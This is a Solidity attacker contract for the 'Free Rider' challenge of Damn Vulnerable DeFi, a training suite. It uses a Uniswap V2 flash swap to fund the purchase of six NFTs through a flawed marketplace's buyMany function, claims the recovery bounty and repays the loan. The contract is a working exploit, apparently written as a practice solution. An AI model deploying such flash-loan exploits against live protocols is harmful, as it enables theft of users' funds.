// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {IUniswapV2Callee} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol";
import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
import {FreeRiderNFTMarketplace} from "../../src/free-rider/FreeRiderNFTMarketplace.sol";
import {FreeRiderRecoveryManager} from "../../src/free-rider/FreeRiderRecoveryManager.sol";
import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
import {WETH} from "solmate/tokens/WETH.sol";
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract FrieRiderAttacker is IUniswapV2Callee, IERC721Receiver {
    IUniswapV2Pair immutable uniswapPair;
    FreeRiderNFTMarketplace immutable marketplace;
    FreeRiderRecoveryManager immutable recoveryManager;
    DamnValuableNFT immutable nft;
    address player;

    constructor(
        IUniswapV2Pair _uniswapPair,
        FreeRiderNFTMarketplace _marketplace,
        FreeRiderRecoveryManager _recoveryManager,
        DamnValuableNFT _nft,
        address _player
    ) {
        uniswapPair = _uniswapPair;
        marketplace = _marketplace;
        recoveryManager = _recoveryManager;
        nft = _nft;
        player = _player;
    }

    function startFlashSwap(WETH tokenBorrow, uint256 amount) external {
        address token0;
        address token1;

        // want to borrow WETH, so we switch order of tokens
        token0 = uniswapPair.token1();
        token1 = uniswapPair.token0();

        uint256 amount0Out = address(tokenBorrow) == token0 ? 0 : amount;
        uint256 amount1Out = address(tokenBorrow) == token1 ? 0 : amount;

        bytes memory data = abi.encode(tokenBorrow, amount);
        // 1. swap tokens in Uniswap V2 pair - this will trigger uniswapV2Call
        uniswapPair.swap(amount0Out, amount1Out, address(this), data);
    }

    // 2. this function is called by Uniswap V2 pair after swap
    function uniswapV2Call(
        address sender,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) external override {
        address pair = msg.sender;
        require(pair == address(uniswapPair), "Invalid pair");

        (WETH tokenBorrow, uint256 amount) = abi.decode(data, (WETH, uint256));
        uint256[] memory tokenIds = new uint256[](6);
        for (uint i = 0; i < 6; i++) {
            tokenIds[i] = i;
        }

        tokenBorrow.withdraw(tokenBorrow.balanceOf(address(this)));
        // 3. buy all NFTs from the marketplace
        marketplace.buyMany{value: amount}(tokenIds);

        bytes memory encodedData = abi.encode(address(this));

        // 4. transfer NFTs to the recovery manager
        for (uint i = 0; i < 6; i++) {
            nft.safeTransferFrom(
                address(this),
                address(recoveryManager),
                i,
                encodedData
            );
        }

        // 5. calculate the amount to repay
        uint fee = ((amount * 3) / 997) + 1;
        uint amountToRepay = amount + fee;

        // 6. transfer the remaining ETH to player
        (bool success, ) = address(player).call{
            value: address(this).balance - amountToRepay
        }("");
        require(success, "ETH transfer failed");

        // 7. repay the borrowed amount to Uniswap V2 pair
        tokenBorrow.deposit{value: amountToRepay}();
        tokenBorrow.transfer(address(uniswapPair), amountToRepay);
        // after repaying the borrowed amount, the code from here will not be executed
    }

    // this function is called when the attacker purchases NFTs
    function onERC721Received(
        address,
        address,
        uint256 _tokenId,
        bytes memory _data
    ) external override returns (bytes4) {
        return this.onERC721Received.selector;
    }

    receive() external payable {}
}
